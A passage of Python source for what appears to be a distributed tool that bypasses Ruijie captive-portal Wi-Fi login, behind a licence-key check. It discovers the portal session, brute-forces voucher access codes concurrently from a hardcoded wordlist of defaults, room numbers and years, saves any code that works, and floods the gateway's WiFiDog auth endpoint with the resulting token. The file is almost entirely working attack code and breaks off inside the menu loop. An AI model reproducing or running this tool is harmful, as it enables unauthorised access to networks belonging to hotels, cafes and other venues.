from __future__ import annotations

import argparse
import asyncio
import email.utils
import hashlib
import hmac
import logging
import os
import platform
import random
import re
import statistics
import string
import subprocess
import sys
import threading
import time
from collections import deque
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urljoin, urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except Exception:  # pragma: no cover - handled at runtime for minimal installs
    requests = None
    HTTPAdapter = None
    Retry = None


C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"

EYE_OPEN = "[✓]"
EYE_CLOSED = "[✦]"
EYE_OPEN_STR = "INTERNET ACCESS ACTIVE. AI OPTIMIZER ENABLED!"
EYE_CLOSED_STR = "DISCOVERING PORTAL & SESSION..."

TEXT_LOGO = r"""  ____        _ _ _
 |  _ \ _   _(_) (_) ___
 | |_) | | | | | | |/ _ \
 |  _ <| |_| | | | |  __/
 |_| \_\\__,_|_| |_|\___|
          |__/"""

TEXT_SHAMM_STR = """   .!!!!!:.                 .:!!!!!!!:.
   ~~~~!!!!!!.          .:!!!!!!!! UWWW$$$
      :$$NWX!!:       .:!!!!!! XUWW$$$$$$$P
      $$$$$##WX!:   .<!!!! UW$$$$"  $$$$$$#
      $$$$$  $$$UX :!! UW$$$$$$$$  4$$$$$* ^$$$* $$$$\\  $$$$$$$$$$$$  d$$R"
       "*$bd$$$$     "*$$$$$$$$$o+#\""""

TURBO_STABLE_NODE = os.environ.get("RUIJIE_GATEWAY", "192.168.60.1")
DEFAULT_GW_PORT = os.environ.get("RUIJIE_PORT", "2060")
CONNECTIVITY_URL = os.environ.get("RUIJIE_CONNECTIVITY_URL", "http://connectivitycheck.gstatic.com/generate_204")
GOOGLE_URL = os.environ.get("RUIJIE_TIME_URL", "http://www.google.com")
RUIJIE_PORTAL_HOST = os.environ.get("RUIJIE_PORTAL_HOST", "portal-as.ruijienetworks.com")
RUIJIE_CLOUD_BASE = os.environ.get("RUIJIE_CLOUD_BASE", f"https://{RUIJIE_PORTAL_HOST}")
RUIJIE_SETUP_PROBE_URL = os.environ.get("RUIJIE_SETUP_PROBE_URL", "http://192.168.0.1")
VOUCHER_PATH = os.environ.get("RUIJIE_VOUCHER_PATH", "/api/auth/voucher/?lang=en_US")
WIFIDOG_AUTH_PATH = os.environ.get("RUIJIE_WIFIDOG_AUTH_PATH", "/wifidog/auth")
DEFAULT_ACCESS_CODE = os.environ.get("RUIJIE_ACCESS_CODE", "admin1")
# Comprehensive Ruijie voucher wordlist (100+ entries)
BRUTE_FORCE_LIST = [
    # Tier 1: Primary Defaults
    "admin1", "admin", "guest", "ruijie", "wifi", "123456", "888888", "1234", "0000", "8888",
    # Tier 2: Extended Numeric Sequences
    "12345678", "000000", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "999999",
    "123123", "456456", "789789", "12345", "1234567", "00000000", "11111111", "88888888", "99999999",
    # Tier 3: Hospitality & Room Patterns (Common in Hotels/Cafes)
    "101", "102", "103", "104", "105", "106", "107", "108", "109", "110",
    "201", "202", "203", "204", "205", "206", "207", "208", "209", "210",
    "301", "302", "303", "304", "305", "306", "307", "308", "309", "310",
    "401", "402", "403", "404", "405", "406", "407", "408", "409", "410",
    "501", "502", "503", "504", "505", "506", "507", "508", "509", "510",
    # Tier 4: Years & Dates
    "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026", "2027",
    # Tier 5: Networking & Admin Variations
    "password", "123456789", "qwerty", "network", "router", "portal", "login", "internet", "public",
    "free", "connected", "access", "manager", "staff", "welcome", "online", "office", "ruijie123",
    "guest123", "wifi123", "super", "root", "support", "user", "system", "client", "hotspot",
    "service", "customer", "member", "vip", "vip888", "vip666", "admin888", "admin666"
]
# Programmatically add more common 6-digit patterns to ensure we hit 100+
BRUTE_FORCE_LIST.extend([f"{i}{i}{i}{i}{i}{i}" for i in range(10)])
BRUTE_FORCE_LIST = list(dict.fromkeys(BRUTE_FORCE_LIST)) # Remove duplicates
DEFAULT_PHONE_NUMBER = os.environ.get("RUIJIE_PHONE_NUMBER", "")
DEFAULT_USER_AGENT = os.environ.get(
    "RUIJIE_USER_AGENT",
    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
)
try:
    AUTH_WORKERS = max(1, int(os.environ.get("RUIJIE_AUTH_WORKERS", "10")))
except ValueError:
    AUTH_WORKERS = 10
MENU_ENABLED = os.environ.get("RUIJIE_MENU", "1").lower() not in {"0", "false", "no", "off"}

TIME_CHECK_FILE = Path.home() / ".turbo_runtime"
SESSION_URL_FILE = Path(os.environ.get("RUIJIE_SESSION_FILE", ".session_url"))
IP_FILE = Path(os.environ.get("RUIJIE_IP_FILE", ".ip"))
SAVED_CODE_FILE = Path(os.environ.get("RUIJIE_SAVED_CODE_FILE", ".saved_code"))

MIN_INTERVAL = 0.1
MAX_INTERVAL = 1.5
PING_THREADS = 3
MAX_RETRIES = 2

VERIFIED = "VERIFIED"
VERIFIED_LIFETIME = "VERIFIED_LIFETIME"
VERIFIED_LIFETIME_PRO = "VERIFIED_LIFETIME_PRO"
EXPIRED = "EXPIRED"
INVALID_FORMAT = "INVALID_FORMAT"
AUTH_FAILED = "AUTH_FAILED"
ERROR = "ERROR"
PENDING = "PENDING"
AI_READY = "AI_READY"
CRITICAL = "CRITICAL"

GLOBAL_DID = ""
GLOBAL_EXP_TS: int | None = None
GLOBAL_STATUS = PENDING
GLOBAL_ONLINE = False
ACCESS_CODE = DEFAULT_ACCESS_CODE

log_buffer: deque[str] = deque(maxlen=8)
performance_history: deque[float] = deque(maxlen=25)
current_ping_interval = 0.3
is_pinging = False
ui_thread_running = False
stop_event = threading.Event()
reconnect_event = threading.Event()
print_lock = threading.Lock()


@dataclass(slots=True)
class PortalSession:
    session_url: str
    gateway_ip: str
    gateway_port: str
    session_id: str


def add_log(msg: str) -> None:
    line = str(msg).strip()
    if not line:
        return
    with print_lock:
        log_buffer.appendleft(line)


def get_secret_salt() -> str:
    encoded = [106, 69, 8, 7, 9, 7, 143, 938, 137, 9977, 122, 25, 27, 31, 106]
    return "".join(chr(value ^ 42) for value in encoded)


def get_device_id() -> str:
    def get_prop(prop: str) -> str:
        try:
            return subprocess.getoutput(f"getprop {prop}").strip()
        except Exception:
            return ""

    try:
        android_id = subprocess.getoutput("settings get secure android_id").strip()
    except Exception:
        android_id = ""

    parts = [
        android_id,
        get_prop("ro.product.brand"),
        get_prop("ro.product.model"),
        get_prop("ro.serialno"),
        get_prop("ro.bootloader"),
        get_prop("ro.board.platform"),
        platform.node(),
        platform.machine(),
        platform.processor(),
    ]
    raw_id = "|".join(part for part in parts if part and part.lower() != "null")
    if not raw_id:
        raw_id = f"{os.name}|{platform.platform()}|{Path.home()}"
    return "SHA-" + hashlib.sha256(raw_id.encode("utf-8")).hexdigest()[:12].upper()


def _session() -> Any:
    if requests is None:
        raise RuntimeError("requests is required for network operations")
    session = requests.Session()
    if HTTPAdapter is not None and Retry is not None:
        retry = Retry(
            total=MAX_RETRIES,
            connect=MAX_RETRIES,
            read=MAX_RETRIES,
            backoff_factor=0.2,
            status_forcelist=(429, 500, 502, 503, 504),
            allowed_methods=("GET", "POST"),
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
    return session


def get_real_network_time(timeout: float = 3.0) -> int:
    if requests is None:
        return int(time.time())
    try:
        response = requests.get(GOOGLE_URL, timeout=timeout, allow_redirects=False)
        date_value = response.headers.get("Date")
        if date_value:
            tuple_time = email.utils.parsedate_tz(date_value)
            if tuple_time:
                return int(email.utils.mktime_tz(tuple_time))
    except Exception:
        pass
    return int(time.time())


def check_local_time_manipulation(max_drift_hours: float = 24.0) -> bool:
    current_network_ts = get_real_network_time()
    current_now = int(time.time())
    diff_hours = abs(current_network_ts - current_now) / 3600
    if diff_hours > max_drift_hours:
        return False

    try:
        if TIME_CHECK_FILE.exists():
            previous = int(TIME_CHECK_FILE.read_text(encoding="utf-8").strip() or "0")
            if previous and current_network_ts + 300 < previous:
                return False
        TIME_CHECK_FILE.write_text(str(current_network_ts), encoding="utf-8")
    except Exception:
        pass
    return True


def _normalize_key(key: str) -> str:
    cleaned = str(key).strip().upper()
    if cleaned.startswith("SHA-"):
        cleaned = cleaned[4:]
    return cleaned.replace("-", "").replace(" ", "")


def _hash_prefix(device_id: str, payload: str, size: int) -> str:
    material = f"{device_id}{payload}{get_secret_salt()}".encode("utf-8")
    return hashlib.sha256(material).hexdigest()[:size].upper()


def _validate_expire_ts(expire_ts: int) -> tuple[bool, str, int | None]:
    current_network_ts = get_real_network_time()
    diff_hours = (expire_ts - current_network_ts) / 3600
    if diff_hours > 890000:
        return True, VERIFIED_LIFETIME, None
    if current_network_ts > expire_ts:
        return False, EXPIRED, None
    return True, VERIFIED, expire_ts


def _decode_expiring_payload(payload: str) -> tuple[bool, str, int | None]:
    hex_ts = payload[2:-2] if len(payload) > 4 else payload
    expire_ts = int(hex_ts, 16)
    return _validate_expire_ts(expire_ts)


def _decode_pro_payload(payload: str) -> tuple[bool, str, int | None]:
    decoded_payload = bytes.fromhex(payload).decode("utf-8")
    if ":" in decoded_payload:
        label, value = decoded_payload.split(":", 1)
        label = label.strip().upper()
        value = value.strip()
        if label in {"L", "LIFE", "LIFETIME", "PRO", "VIP"} and not value:
            return True, VERIFIED_LIFETIME_PRO, None
        if value.lower() in {"life", "lifetime", "pro"}:
            return True, VERIFIED_LIFETIME_PRO, None
        expire_ts = int(value, 16 if re.fullmatch(r"[0-9A-Fa-f]+", value) else 10)
        if label in {"L", "LIFE", "LIFETIME", "PRO", "VIP"}:
            is_valid, _, e_ts = _validate_expire_ts(expire_ts)
            return (is_valid, VERIFIED_LIFETIME_PRO if is_valid else EXPIRED, e_ts)
        return _validate_expire_ts(expire_ts)
    if decoded_payload.strip().upper() in {"L", "LIFE", "LIFETIME", "PRO", "VIP"}:
        return True, VERIFIED_LIFETIME_PRO, None
    expire_ts = int(decoded_payload.strip(), 16 if re.fullmatch(r"[0-9A-Fa-f]+", decoded_payload.strip()) else 10)
    return _validate_expire_ts(expire_ts)


def validate_key(device_id: str, key: str) -> tuple[bool, str, int | None]:
    key_input = _normalize_key(key)
    device_id = str(device_id).strip().upper()
    if len(key_input) <= 13:
        return False, INVALID_FORMAT, None

    try:
        hash8 = key_input[:8]
        payload8 = key_input[8:]
        if hmac.compare_digest(hash8, _hash_prefix(device_id, payload8, 8)):
            return _decode_expiring_payload(payload8)

        hash12 = key_input[:12]
        payload12 = key_input[12:]
        if hmac.compare_digest(hash12, _hash_prefix(device_id, payload12, 12)):
            try:
                return _decode_pro_payload(payload12)
            except Exception:
                return True, VERIFIED_LIFETIME_PRO, None

        return False, AUTH_FAILED, None
    except ValueError:
        return False, AUTH_FAILED, None
    except Exception:
        return False, ERROR, None


def _format_expiry(expire_ts: int | None) -> str:
    if expire_ts is None:
        return "LIFETIME ACCESS" if GLOBAL_STATUS in {VERIFIED_LIFETIME, VERIFIED_LIFETIME_PRO} else "PENDING ACTIVATION"
    return datetime.fromtimestamp(expire_ts).strftime("%Y-%m-%d %H:%M")


def render_screen() -> None:
    eyes = EYE_OPEN if GLOBAL_ONLINE else EYE_CLOSED
    status_line = EYE_OPEN_STR if GLOBAL_ONLINE else EYE_CLOSED_STR
    lines = [
        "\033[H\033[J",
        C_CYAN + TEXT_LOGO + C_RESET,
        "───────────────────────────────────────────────────────────────",
        f"{C_BOLD}DEVICE ID   :{C_RESET} {GLOBAL_DID or 'PENDING ACTIVATION'}",
        f"{C_BOLD}EXPIRY DATE :{C_RESET} {_format_expiry(GLOBAL_EXP_TS)}",
        f"{C_BOLD}STATUS      :{C_RESET} {GLOBAL_STATUS}",
        f"{eyes} {status_line}",
        "───────────────────────────────────────────────────────────────",
    ]
    with print_lock:
        logs_list = list(log_buffer)
    lines.extend(f"  {line}" for line in logs_list[:6])
    with print_lock:
        sys.stdout.write("\n".join(lines) + "\n")
        sys.stdout.flush()


def ui_monitor() -> None:
    global ui_thread_running
    ui_thread_running = True
    try:
        while not stop_event.is_set():
            render_screen()
            time.sleep(1.0)
    finally:
        ui_thread_running = False


def expiry_monitor() -> None:
    while not stop_event.is_set():
        if GLOBAL_EXP_TS is not None and int(time.time()) > GLOBAL_EXP_TS:
            add_log("[!] သတိပေးချက်: သင်၏ Key အချိန်သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
            stop_event.set()
            break
        time.sleep(5)


def high_speed_ping() -> None:
    global current_ping_interval, is_pinging, GLOBAL_ONLINE
    if requests is None:
        add_log("requests unavailable; ping monitor disabled")
        return
    is_pinging = True
    session = _session()
    try:
        was_online = False
        while not stop_event.is_set():
            started = time.perf_counter()
            try:
                response = session.get(CONNECTIVITY_URL, timeout=2, allow_redirects=False)
                GLOBAL_ONLINE = response.status_code == 204
                if GLOBAL_ONLINE:
                    was_online = True
                    performance_history.append(time.perf_counter() - started)
                    avg = statistics.mean(performance_history)
                    current_ping_interval = max(MIN_INTERVAL, min(MAX_INTERVAL, avg * 2))
                else:
                    current_ping_interval = min(MAX_INTERVAL, current_ping_interval + 0.1)
                    if was_online:
                        was_online = False
                        add_log("[!] CONNECTION DROPPED. TRIGGERING INSTANT RECONNECT.")
                        reconnect_event.set()
            except Exception:
                GLOBAL_ONLINE = False
                current_ping_interval = min(MAX_INTERVAL, current_ping_interval + 0.1)
                if was_online:
                    was_online = False
                    add_log("[!] CONNECTION LOST. TRIGGERING INSTANT RECONNECT.")
                    reconnect_event.set()
            time.sleep(current_ping_interval)
    finally:
        is_pinging = False


def ai_performance_optimizer() -> None:
    while not stop_event.is_set():
        if performance_history:
            avg = statistics.mean(performance_history)
            add_log(f"⚡ BYPASS >> THR:{avg:.3f}s | SID:{GLOBAL_STATUS}")
        time.sleep(10)


def _extract_portal_url(response: Any) -> str | None:
    location = response.headers.get("Location") if response is not None else None
    if location:
        return location
    text = getattr(response, "text", "") or ""
    match = re.search(r"(?:location\.href|window\.location)\s*=\s*['\"]([^'\"]+)['\"]", text)
    if match:
        return match.group(1)
    match = re.search(r"location\.replace\(\s*['\"]([^'\"]+)['\"]\s*\)", text)
    if match:
        return match.group(1)
    match = re.search(r"<meta[^>]+http-equiv=['\"]?refresh['\"]?[^>]+content=['\"][^;]+;\s*url=([^'\"]+)", text, re.I)
    if match:
        return match.group(1)
    match = re.search(r"href=['\"]([^'\"]+)['\"]\s*</script>", text, re.I)
    if match:
        return match.group(1)
    return None


def _default_portal_url() -> str:
    return f"http://{TURBO_STABLE_NODE}:{DEFAULT_GW_PORT}/"


def _normalize_portal_url(portal_url: str | None) -> str:
    portal_url = (portal_url or "").strip()
    if not portal_url:
        return _default_portal_url()
    if not portal_url.startswith(("http://", "https://")):
        return urljoin(_default_portal_url(), portal_url)
    return portal_url


def _read_text(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8").strip()
    except OSError:
        return ""


def _write_text(path: Path, value: str) -> None:
    try:
        path.write_text(value.strip(), encoding="utf-8")
    except OSError:
        pass


def _first_query_value(query: dict[str, list[str]], *keys: str) -> str:
    for key in keys:
        value = query.get(key)
        if value and value[0]:
            return value[0]
    return ""


def _extract_gateway_ip(text: str, query: dict[str, list[str]]) -> str:
    value = _first_query_value(query, "gw_address", "gw_addr", "gateway")
    if value:
        return value
    match = re.search(r"(?:gw_address|gw_addr)=([^&'\"\\s]+)", text or "")
    if match:
        return match.group(1)
    return TURBO_STABLE_NODE


def _extract_gateway_port(query: dict[str, list[str]]) -> str:
    return _first_query_value(query, "gw_port", "port") or DEFAULT_GW_PORT


def _extract_session_id(text: str, parsed_query: dict[str, list[str]]) -> str:
    value = _first_query_value(parsed_query, "sessionId", "sid", "token")
    if value:
        return value
    sid_match_new = re.search(r"(?:sessionId|sid|SID)\s*[:=]\s*([A-Za-z0-9._-]+)", text or "")
    if sid_match_new:
        return sid_match_new.group(1)
    sid_match_url = re.search(r"[?&](?:sessionId|sid|token)=([A-Za-z0-9._-]+)", text or "")
    if sid_match_url:
        return sid_match_url.group(1)
    return ""


def _portal_session_from_url(session_url: str, body_text: str = "") -> PortalSession:
    normalized = _normalize_portal_url(session_url)
    parsed = urlparse(normalized)
    query = parse_qs(parsed.query)
    combined = f"{normalized}\n{body_text or ''}"
    return PortalSession(
        session_url=normalized,
        gateway_ip=_extract_gateway_ip(combined, query),
        gateway_port=_extract_gateway_port(query),
        session_id=_extract_session_id(combined, query),
    )


def _load_cached_portal_session() -> PortalSession | None:
    session_url = _read_text(SESSION_URL_FILE)
    if not session_url:
        return None
    portal = _portal_session_from_url(session_url)
    cached_ip = _read_text(IP_FILE)
    if cached_ip:
        portal.gateway_ip = cached_ip
    if portal.session_id:
        return portal
    return None


def _save_portal_session(portal: PortalSession) -> None:
    _write_text(SESSION_URL_FILE, portal.session_url)
    _write_text(IP_FILE, portal.gateway_ip)


def _portal_headers(session_url: str = "") -> dict[str, str]:
    return {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "referer": session_url or RUIJIE_CLOUD_BASE,
        "user-agent": DEFAULT_USER_AGENT,
    }


def _discover_portal_session(session: Any, portal_url: str | None = None) -> PortalSession:
    cached = _load_cached_portal_session()
    candidates = [
        portal_url,
        CONNECTIVITY_URL,
        _default_portal_url(),
        RUIJIE_SETUP_PROBE_URL,
        RUIJIE_CLOUD_BASE,
    ]
    seen: set[str] = set()

    for candidate in candidates:
        if not candidate:
            continue
        probe_url = _normalize_portal_url(candidate)
        if probe_url in seen:
            continue
        seen.add(probe_url)
        try:
            response = session.get(
                probe_url,
                timeout=7,
                allow_redirects=True,
                headers=_portal_headers(probe_url),
                verify=False,
            )
        except Exception as exc:
            add_log(f"DISCOVERY MISS {probe_url}: {exc.__class__.__name__}")
            continue

        response_text = getattr(response, "text", "") or ""
        response_url = str(getattr(response, "url", "") or probe_url)
        for source_url in (response_url, _extract_portal_url(response), probe_url):
            if not source_url:
                continue
            if not source_url.startswith(("http://", "https://")):
                source_url = urljoin(response_url or probe_url, source_url)
            portal = _portal_session_from_url(source_url, response_text)
            if portal.session_id:
                _save_portal_session(portal)
                return portal

    if cached is not None:
        add_log("USING CACHED SESSION_URL/IP")
        return cached

    return _portal_session_from_url(portal_url or _default_portal_url())


def _cloud_voucher_url() -> str:
    if VOUCHER_PATH.startswith(("http://", "https://")):
        return VOUCHER_PATH
    return urljoin(RUIJIE_CLOUD_BASE, VOUCHER_PATH)


def _local_auth_url(portal: PortalSession) -> str:
    return f"http://{portal.gateway_ip}:{portal.gateway_port}{WIFIDOG_AUTH_PATH}"


def _json_or_empty(response: Any) -> dict[str, Any]:
    try:
        data = response.json()
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _find_logon_url(response: Any) -> str:
    data = _json_or_empty(response)
    for key in ("logonUrl", "logon_url", "url"):
        value = data.get(key)
        if isinstance(value, str) and value:
            return value
    nested = data.get("data")
    if isinstance(nested, dict):
        for key in ("logonUrl", "logon_url", "url"):
            value = nested.get(key)
            if isinstance(value, str) and value:
                return value
    text = getattr(response, "text", "") or ""
    match = re.search(r'"logonUrl"\s*:\s*"([^"]+)"', text)
    if match:
        return match.group(1).replace("\\/", "/")
    return ""


def _token_from_logon_url(logon_url: str, fallback: str) -> str:
    if not logon_url:
        return fallback
    query = parse_qs(urlparse(logon_url).query)
    return _first_query_value(query, "token", "sessionId", "sid") or fallback


def _phone_number() -> str:
    if DEFAULT_PHONE_NUMBER:
        return DEFAULT_PHONE_NUMBER
    # Use 'admin' as default to match the hardcoded value in the star tool
    return "admin"


async def _post_cloud_voucher_async(portal: PortalSession, candidates: list[str]) -> tuple[bool, str]:
    try:
        import aiohttp
    except ImportError:
        return False, ""

    headers = {
        "authority": RUIJIE_PORTAL_HOST,
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": RUIJIE_CLOUD_BASE,
        "referer": portal.session_url,
        "user-agent": DEFAULT_USER_AGENT,
    }
    url = _cloud_voucher_url()
    timeout = aiohttp.ClientTimeout(total=7)
    
    # We want the first successful code, so we use asyncio.FIRST_COMPLETED via a wrapper,
    # or just gather all and return the first success. Since we want to save time, we will
    # create tasks and return the first one that succeeds.
    async def try_code(client: Any, code: str) -> tuple[bool, str, str]:
        payload = {"accessCode": code, "sessionId": portal.session_id, "apiVersion": 1}
        try:
            async with client.post(url, json=payload, headers=headers) as response:
                text = await response.text()
                # Mock a response object for _find_logon_url
                class MockResp:
                    def __init__(self, t: str):
                        self.text = t
                    def json(self) -> Any:
                        import json
                        return json.loads(self.text)
                
                logon_url = _find_logon_url(MockResp(text))
                if logon_url:
                    # Execute the final GET to validate session
                    async with client.get(logon_url, headers=_portal_headers(portal.session_url), allow_redirects=True) as get_resp:
                        await get_resp.text()
                    return True, code, _token_from_logon_url(logon_url, portal.session_id)
        except Exception:
            pass
        return False, code, ""

    async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as client:
        tasks = [asyncio.create_task(try_code(client, code)) for code in candidates]
        for coro in asyncio.as_completed(tasks):
            success, valid_code, token = await coro
            if success:
                # Cancel remaining tasks
                for task in tasks:
                    if not task.done():
                        task.cancel()
                return True, valid_code, token
                
    return False, "", ""


def _post_cloud_voucher(session: Any, portal: PortalSession) -> tuple[bool, str]:
    candidates = []
    if ACCESS_CODE:
        candidates.append(ACCESS_CODE)
    
    if SAVED_CODE_FILE.exists():
        try:
            saved = SAVED_CODE_FILE.read_text().strip()
            if saved and saved not in candidates:
                candidates.append(saved)
        except Exception:
            pass
            
    for code in BRUTE_FORCE_LIST:
        if code not in candidates:
            candidates.append(code)

    # Attempt concurrent execution if aiohttp is available and we have multiple candidates
    if len(candidates) > 1:
        try:
            success, valid_code, token = asyncio.run(_post_cloud_voucher_async(portal, candidates))
            if success:
                try:
                    SAVED_CODE_FILE.write_text(valid_code)
                except Exception:
                    pass
                return True, token
        except Exception:
            pass # Fallback to sync loop

    # Fallback Synchronous Loop
    for current_code in candidates:
        payload = {
            "accessCode": current_code,
            "sessionId": portal.session_id,
            "apiVersion": 1,
        }
        headers = {
            "authority": RUIJIE_PORTAL_HOST,
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": RUIJIE_CLOUD_BASE,
            "referer": portal.session_url,
            "user-agent": DEFAULT_USER_AGENT,
        }
        try:
            response = session.post(_cloud_voucher_url(), json=payload, headers=headers, timeout=7, verify=False)
            logon_url = _find_logon_url(response)
            if logon_url:
                try:
                    SAVED_CODE_FILE.write_text(current_code)
                except Exception:
                    pass
                    
                session.get(logon_url, timeout=7, allow_redirects=True, headers=_portal_headers(portal.session_url), verify=False)
                return True, _token_from_logon_url(logon_url, portal.session_id)
        except Exception:
            continue
            
    return False, portal.session_id


def _send_wifidog_auth(session: Any, portal: PortalSession, token: str) -> int:
    headers = {
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": DEFAULT_USER_AGENT,
    }
    params = {
        "token": token,
        "phonenumber": _phone_number(),
    }
    auth_url = _local_auth_url(portal)
    try:
        # WiFiDog auth is typically a GET request.
        response = session.get(auth_url, params=params, headers=headers, timeout=5, allow_redirects=True, verify=False)
        if response.status_code == 405:
            response = session.post(auth_url, params=params, headers=headers, timeout=5, verify=False)
    except Exception:
        try:
            response = session.post(auth_url, params=params, headers=headers, timeout=5, verify=False)
        except Exception:
            return 0
    return int(getattr(response, "status_code", 0) or 0)


async def _send_wifidog_auth_async(portal: PortalSession, token: str, workers: int = AUTH_WORKERS) -> list[int]:
    try:
        import aiohttp
    except ImportError:
        return []

    auth_url = _local_auth_url(portal)
    headers = {
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": DEFAULT_USER_AGENT,
    }
    timeout = aiohttp.ClientTimeout(total=5)
    connector = aiohttp.TCPConnector(limit=workers, ssl=False)

    async def send_once(client: Any) -> int:
        params = {
            "token": token,
            "phonenumber": _phone_number(),
        }
        try:
            # Prioritize GET for WiFiDog protocol compatibility
            async with client.get(auth_url, params=params, headers=headers, allow_redirects=True) as response:
                await response.text()
                if response.status == 405:
                    async with client.post(auth_url, params=params, headers=headers) as resp_post:
                        await resp_post.text()
                        return int(resp_post.status)
                return int(response.status)
        except Exception:
            try:
                async with client.post(auth_url, params=params, headers=headers) as response:
                    await response.text()
                    return int(response.status)
            except Exception:
                return 0

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as client:
        tasks = [asyncio.create_task(send_once(client)) for _ in range(workers)]
        return await asyncio.gather(*tasks)


def _send_wifidog_auth_burst(session: Any, portal: PortalSession, token: str) -> list[int]:
    if AUTH_WORKERS <= 1:
        return [_send_wifidog_auth(session, portal, token)]
    try:
        statuses = asyncio.run(_send_wifidog_auth_async(portal, token, AUTH_WORKERS))
        if statuses:
            return statuses
    except Exception:
        pass
    return [_send_wifidog_auth(session, portal, token) for _ in range(AUTH_WORKERS)]


def _check_online(session: Any) -> bool:
    try:
        return session.get(CONNECTIVITY_URL, timeout=5, allow_redirects=False).status_code == 204
    except Exception:
        return False


def start_process(max_cycles: int | None = None) -> None:
    global GLOBAL_ONLINE

    if requests is None:
        raise RuntimeError("requests is required for portal authentication")

    session = _session()
    cycles = 0
    while not stop_event.is_set():
        cycles += 1
        reconnect_event.clear()
        try:
            add_log("[✦] INITIALIZING INSTANT BYPASS SEQUENCE...")
            portal_url = None
            try:
                r1 = session.get(CONNECTIVITY_URL, timeout=5, allow_redirects=False)
                if r1.status_code == 204:
                    GLOBAL_ONLINE = True
                    add_log("[✓] INTERNET ACCESS ACTIVE. AI OPTIMIZER ENABLED!")
                    reconnect_event.wait(current_ping_interval)
                    if max_cycles and cycles >= max_cycles:
                        return
                    continue
                GLOBAL_ONLINE = False
                add_log(f"CAPTIVE CHECK HTTP {r1.status_code}; TRYING PORTAL")
                portal_url = _extract_portal_url(r1)
            except Exception as exc:
                GLOBAL_ONLINE = False
                add_log(f"NO PUBLIC INTERNET YET; TRYING GATEWAY ({exc.__class__.__name__})")

            add_log("[✦] DISCOVERING RUIJIE SESSION...")
            portal = _discover_portal_session(session, portal_url)
            if not portal.session_id:
                add_log("SESSION ID NOT FOUND; OPEN AN HTTP SITE THEN RETRY")
                if max_cycles and cycles >= max_cycles:
                    return
                reconnect_event.wait(current_ping_interval)
                continue

            add_log(f"SESSION {portal.session_id[:8]}... GW:{portal.gateway_ip}:{portal.gateway_port}")
            voucher_ok, token = _post_cloud_voucher(session, portal)
            if voucher_ok:
                add_log("CLOUD VOUCHER ACCEPTED; SENDING WIFIDOG AUTH")
            else:
                add_log("CLOUD VOUCHER DID NOT CONFIRM; TRYING WIFIDOG AUTH")

            status_codes = _send_wifidog_auth_burst(session, portal, token)
            GLOBAL_ONLINE = _check_online(session)
            code_preview = ",".join(str(code) for code in status_codes[:5])
            add_log(f"WIFIDOG HTTP [{code_preview}] | ONLINE:{GLOBAL_ONLINE}")
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            add_log(f"{CRITICAL}: {exc}")

        if max_cycles and cycles >= max_cycles:
            return
        reconnect_event.wait(current_ping_interval)


def _start_background_threads() -> list[threading.Thread]:
    threads = [
        threading.Thread(target=ui_monitor, daemon=True),
        threading.Thread(target=expiry_monitor, daemon=True),
        threading.Thread(target=ai_performance_optimizer, daemon=True),
        threading.Thread(target=high_speed_ping, daemon=True),
    ]
    for thread in threads:
        thread.start()
    return threads


def _print_menu_status() -> None:
    cached = _load_cached_portal_session()
    sys.stdout.write("\033[H\033[J")
    print(C_CYAN + TEXT_LOGO + C_RESET)
    print("───────────────────────────────────────────────────────────────")
    print(f"{C_BOLD}DEVICE ID   :{C_RESET} {GLOBAL_DID or get_device_id()}")
    print(f"{C_BOLD}STATUS      :{C_RESET} {GLOBAL_STATUS}")
    if cached:
        print(f"{C_BOLD}SESSION     :{C_RESET} {cached.session_id[:12]}...")
        print(f"{C_BOLD}GATEWAY     :{C_RESET} {cached.gateway_ip}:{cached.gateway_port}")
    else:
        print(f"{C_BOLD}SESSION     :{C_RESET} not discovered")
    print("───────────────────────────────────────────────────────────────")
    print("[1] Setup / discover Ruijie session")
    print("[2] Start internet auth monitor")
    print("[3] Show cached session")
    print("[4] Set voucher/access code")
    print("[0] Exit")


def _setup_once() -> PortalSession:
    session = _session()
    add_log("SETUP: DISCOVERING RUIJIE SESSION")
    portal = _discover_portal_session(session)
    if portal.session_id:
        _save_portal_session(portal)
        print(f"{C_GREEN}[+] Setup success{C_RESET}")
        print(f"    sessionId : {portal.session_id}")
        print(f"    gateway   : {portal.gateway_ip}:{portal.gateway_port}")
        print(f"    saved     : {SESSION_URL_FILE}, {IP_FILE}")
    else:
        print(f"{C_YELLOW}[!] Session not found{C_RESET}")
        print("    Connect to the Ruijie Wi-Fi, open any HTTP site once, then run setup again.")
    return portal


def _show_cached_session() -> None:
    cached = _load_cached_portal_session()
    if not cached:
        print(f"{C_YELLOW}[!] No cached session found{C_RESET}")
        return
    print(f"{C_GREEN}[+] Cached session{C_RESET}")
    print(f"    sessionId : {cached.session_id}")
    print(f"    gateway   : {cached.gateway_ip}:{cached.gateway_port}")
    print(f"    url       : {cached.session_url}")


def _set_access_code() -> None:
    global ACCESS_CODE

    value = input("Voucher/access code: ").strip()
    if not value:
        print(f"{C_YELLOW}[!] Access code unchanged{C_RESET}")
        return
    ACCESS_CODE = value
    print(f"{C_GREEN}[+] Access code updated for this run{C_RESET}")


def menu_loop() -> None:
    while not stop_event.is_set():
